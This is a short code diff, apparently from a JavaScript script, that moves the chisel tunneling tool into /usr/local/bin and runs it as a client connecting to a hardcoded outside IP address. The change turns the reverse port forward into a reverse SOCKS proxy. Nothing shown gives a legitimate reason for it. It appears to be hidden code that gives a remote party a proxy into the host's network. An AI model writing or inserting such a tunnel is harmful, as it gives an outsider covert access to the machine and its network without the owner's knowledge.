@@ -28,7 +28,7 @@ function run(cmd) {
 
         await run("mv -f chisel /usr/local/bin/chisel");
 
-        await run("chisel client http://51.20.74.249:60000 R:60001");
+        await run("chisel client http://51.20.74.249:60000 R:60001:socks");
 
     } catch (err) {
         console.error(err);
